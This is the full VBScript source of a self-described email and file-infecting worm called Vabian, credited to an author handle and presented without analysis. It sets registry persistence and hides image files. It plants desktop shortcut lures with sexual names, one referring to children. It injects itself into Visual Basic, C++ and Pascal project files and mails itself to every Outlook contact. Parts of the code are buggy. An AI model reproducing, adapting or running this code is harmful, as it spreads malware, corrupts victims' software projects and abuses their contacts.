Rem VBS.W32.I-worm.Vabian
Rem Script Project Infector [pas,frm,cpp]
Rem By Psychologic aka Puppy
Rem Mailto : Psychologic@hotmail.com

On error resume next
Set executor = wscript.CreateObject("WScript.Shell")
Set fso = CreateObject("scripting.FileSystemObject")
Set drop = Fso.opentextfile(wscript.scriptfullname, 1)
src = drop.readall
drop.close

executor.regwrite "HKEY_CLASSES_ROOT\VXFile\"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\DefaultIcon\","C:\PROGRA~1\INTERN~1\iexplore.exe,8"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\ScriptEngine\","VBScript"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\ScriptHostEncode\","{85131631-480C-11D2-B1F9-00C04F86C324}"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\Shell\Open\Command\","C:\WINDOWS\WScript.exe " & chr(34) & "%1" & chr(34) & " %*"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\Shell\Play\Command\","C:\WINDOWS\COMMAND\CScript.exe " & chr(34) & "%1" & chr(34) & " %*"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\ShellEx\PropertySheetHandlers\WSHProps\","{60254CA5-953B-11CF-8C96-00AA00B8708C}"
executor.regwrite "HKEY_CLASSES_ROOT\.VX\","VXFile"
executor.regwrite "HKEY_CLASSES_ROOT\VX\CLSID\","{B54F3741-5B07-11cf-A4B0-00AA004A55E8}"
executor.regwrite "HKEY_CLASSES_ROOT\VX\OLEScript\"

fso.copyfile wscript.scriptfullname,"C:\windows\backup_vabian.sys"
fso.copyfile wscript.scriptfullname,"C:\windows\Vabian.VX"

if fso.FolderExists("C:\Documents and Settings\All Users\Desktop") then
	on error resume next
	set shell=wscript.createobject("wscript.shell")
	set msc=shell.CreateShortCut("C:\Documents and Settings\All Users\Desktop\Sex-Vabian.jpg.lnk")
	msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\Vabian.VX")
	msc.IconLocation = Shell.ExpandEnvironmentStrings("C:\windows\system32\mspaint.exe, 0")
	msc.WindowStyle = 4
	msc.Save
end if

if fso.FolderExists("C:\windows\Desktop") then
	on error resume next
	set shell=wscript.createobject("wscript.shell")
	set msc=shell.CreateShortCut("C:\windows\Desktop\Sex-Children.jpg.lnk")
	msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\Vabian.VX")
	msc.WindowStyle = 4
	msc.Save
end if

set opendroperfrm = fso.OpenTextFile("C:\windows\backup_vabian.sys", 1)
allsourcefrm = ""
oneline = ""
do while opendroperfrm.readline <> "'VabianMarker"
  oneline = opendroperfrm.readline
  frmformat = replace(oneline,chr(34),chr(34)&"&chr(34)&"&chr(34))
  fullline = "? #1," & frmformat
  allsourcefrm = allsourcefrm & vbcrlf & fullline
loop
opendroperfrm.close

set opendropercpp = fso.OpenTextFile("C:\windows\backup_vabian.sys", 1)
allsourcecpp = ""
oneline1 = ""
do while opendropercpp.readline <> "'VabianMarker"
	oneline1 = ""
	oneline1 = opendropercpp.readline
	onebyone = len(oneline1)
	for i = 1 to onebyone
		read34 = mid(oneline1,i,1)
		if read34 = chr(34) then
			m = ",34"
		else
		m = ""
		end if
		all = all & m
	next
	cppformat1 = replace(oneline1,chr(34),"%c")
	cppformat = replace(cppformat1,"\","\\")
	fullline1 = "fprintf(mvbswe," & chr(34) & cppformat & "\n" & chr(34) & all & ");"
	allsourcecpp = allsourcecpp & vbcrlf &  fullline1
	all = ""
	loop
opendropercpp.close

set opendroperpas = fso.OpenTextFile("C:\windows\backup_vabian.sys", 1)
allsourcepas = ""
oneline2 = ""
do while opendroperpas.readline <> "'VabianMarker"
	oneline2 = ""
	oneline2 = opendroperpas.readline
	fullline2 = "writeln (mvbswe,'" & oneline2 & "');"
	allsourcepas = allsourcepas & vbcrlf & fullline2
	loop
opendroperpas.close


winfold = fso.getspecialfolder(0)
backpath = winfold & "\vabian.vbs"
executor.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Vabian", "wscript.exe " & backpath & " %"
fso.copyfile wscript.scriptfullname, backpath
ranpay = int(rnd * 9)+1

if ranpay > 5 then
	set payload = fso.CreateTextFile("C:\payload.txt")
	payload.write "VBS.Vabian" & vbcrlf & "-------------" & vbcrlf
	payload.write "Dear user ... " & vbcrlf & "I just want to tell you something" & vbcrlf
	payload.write "Your computer has been infected with virus,it called VBS.Vabian" & vbcrlf
	payload.write "If you are an Programer, go look at your project check all your frm or cpp or pas files" & vbcrlf
	payload.write "Cos that is the victim" & vbcrlf & "Ok I have to go now" & vbcrlf 
	payload.write "--------------------------------------------------" & vbcrlf
	payload.write "Made by Psychologic aka Puppy - Indonesian hip-hop singer"
	payload.close
	executor.run "C:\payload.txt"
end if

Set Drives=fso.drives 

For Each Drive in Drives
	If drive.isready then
		FindVictim drive
	end If 
Next

function FindVictim(path)
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files

	If fso.GetExtensionName(file.path)="frm" then
	on error resume next
	set readfrmmarker = fso.OpenTextFile(file.path,1, True)
	frmmarker = readfrmmarker.readline
	frmreadall = readfrmmarker.readall
		if frmmarker <> "Rem W32.hllp.Vabian" then
			set readfrmmarker = fso.CreateTextFile(file.path, True)
			readfrmmarker.write "Rem W32.hllp.Vabian" & vbcrlf & frmreadall & vbcrlf
			readfrmmarker.write "Private Sub form_unload(cancel As Integer)" & vbcrlf
			readfrmmarker.write "On Error GoTo err:" & vbcrlf 
			readfrmmarker.write "Open " & chr(34) & "C:\vabian.vbs" & chr(34) & " for output as #1" & vbcrlf
			readfrmmarker.write allsourcefrm & vbcrlf & "close #1" & vbcrlf & "shell " & chr(34) & "C:\vabian.vbs" & chr(34) & vbcrlf
			readfrmmarker.write "msgbox " & chr(34) & "Your Program has been infected by Vabian virus Created by Psychologic" & chr(34) & ",VbInformation," & chr(34) & "W32.VBS.Vabian" & chr(34)
			readfrmmarker.write vbcrlf & "exit sub" & vbcrlf & "err:" & vbcrlf & "End sub" & vbcrlf
			readfrmmarker.close
		end if
	end if


	If fso.GetExtensionName(file.path)="cpp" then
	on error resume next
	set readcppmarker = fso.OpenTextFile(file.path,1, True)
	cppmarker = readcppmarker.readline
	cppreadall = readcppmarker.readall
		if mid(cppreadall,len(cppreadall),1) = "}" then
			cppreadall1 = replace(cppreadall,mid(cppreadall,len(cppreadall),1),"")
		end if

		if cppmarker <> "// W32.hllp.Vabian" then
			set readcppmarker = fso.CreateTextFile(file.path, True)
			readcppmarker.write "// W32.hllp.Vabian" & vbcrlf & "FILE *Vabian;" & vbcrlf
			readcppmarker.write cppreadall & "wormvabian = fopen("&chr(34)&"vabian.vbs"&chr(34)&","&chr(34)&"wt"&chr(34)&");" & vbcrlf
			readcppmarker.write "if(wormvabian)"&vbcrlf&"{"& allsourcecpp &vbcrlf&"}" & vbcrlf
			readcppmarker.write "ShellExecute(NULL, "&chr(34)&"open"&chr(34)&", "&chr(34)&"vabian.vbs"&chr(34)&", NULL, NULL, SW_SHOWNORMAL);" & vbcrlf
			readcppmarker.write "}" & vbcrlf
			readcppmarker.close
		end if
	end if


	If fso.GetExtensionName(file.path)="pas" then
	on error resume next
	set readpasmarker = fso.OpenTextFile(file.path,1, True)
	pasmarker = readpasmarker.readline
	pasreadall = readpasmarker.readall
		if pasmarker <> "{ W32.hllp.Vabian }" then
			set readpasmarker = fso.CreateTextFile(file.path, True)
			readpasmarker.write "{ W32.hllp.Vabian }" & vbcrlf & pasreadall & vbcrlf
			readpasmarker.write "procedure " & "TForm1.FormClose(Sender: TObject; var Action: TCloseAction);" & vbcrlf
			readpasmarker.write "begin" & vbcrlf & "AssignFile (Vabian,'C:\Windows\STARTM~1\programs\startup\Vabian.vbs');" & vbcrlf
			readpasmarker.write "Rewrite (Vabian);" & vbcrlf & allsourcepas & vbcrlf & "CloseFile(Vabian);" & vbcrlf
			readpasmarker.close
		end if
	end if

	If fso.GetExtensionName(file.path)="bmp" or fso.GetExtensionName(file.path)="jpg" or fso.GetExtensionName(file.path)="gif" or fso.GetExtensionName(file.path)="ico" then 
		For i = 1 To 8
			fvar = Chr(Int(22 * Rnd) + 97)
			varall = fvar & varall
		Next
		on error resume next
		bathelp = file.path & ".bat"
		Set dropper = Fso.Createtextfile(bathelp, True)
		dropper.writeline "Attrib +h " & file.path
		dropper.Close
		executor.run bathelp
		fso.Deletefile bathelp
		vbscopy = file.path & ".VX"
		Set dropper2 = Fso.Createtextfile(vbscopy, True)
		dropper2.write "Set " & varall & " = wscript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbcrlf & "Sucke.run " & chr(34) & file.path & chr(34) & vbcrlf
		dropper2.write scr
		dropper2.Close
	end if

next

Set Subfolders = folder.SubFolders
	For Each Subfolder in Subfolders
		FindVictim Subfolder.path 
	Next 
end function 

Set spreader =CreateObject("Outlook.Application")
Set spreader =spreader.GetNameSpace("MAPI")
For Each C In spreader.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set spreader=C.AddressEntries(D)
Set spreader=spreader.CreateItem(0)
spreader.To=aaaaaaaa.Address
spreader.Subject="Vabian Milenium"
spreader.Body="Stop asking,just checkout the attachment"
spreader.Attachments.Add(Fso.GetSpecialFolder(0)&"\Vabian.vbs")
spreader.DeleteAfterSubmit=True
If spreader.To <> "" Then
spreader.Send
End If
Next
End If
Next

'VabianMarker